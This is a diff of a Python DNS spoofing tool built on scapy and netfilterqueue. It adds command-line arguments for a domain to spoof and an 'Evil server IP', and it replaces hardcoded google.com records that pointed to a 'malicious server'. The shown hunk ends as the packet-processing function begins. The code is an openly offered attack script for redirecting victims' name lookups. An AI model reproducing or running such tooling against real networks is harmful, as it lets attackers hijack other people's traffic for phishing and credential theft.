@@ -12,19 +12,31 @@
 # ░ ░  ░    ░   ░ ░ ░  ░  ░     ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
 #   ░             ░       ░           ░               ░ ░      ░ ░             ░  ░   ░     
 # ░                                                                                         
-    
-    
-    
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 import pyfiglet
+import argparse
+
+def get_args():
+    parser = argparse.ArgumentParser(
+        description='DNS Spoofer')
+    parser.add_argument(
+        '-d', '--domain', type=str, help='Domain to spoof', required=True)
+    parser.add_argument(
+        '-s', '--server-ip', type=str, help='Evil server IP', required=True)
+    args = parser.parse_args()
+    DOMAIN = args.domain
+    SERVER = args.server_ip
+    return DOMAIN,SERVER
+
+domain,server = get_args()
 
 # DNS host records, for instance here, we want to spoof google.com
 dns_hosts = {
-    b"google.com.": "192.168.1.113", # CHANGE THIS + ADD MALICIOUS SERVER IP
-    b"www.google.com.": "192.168.1.113", # SAME
+    "{0}.".format(domain) : "{0}".format(server),
 }
+print(dns_hosts)
 
 def process_packet(packet):
     """
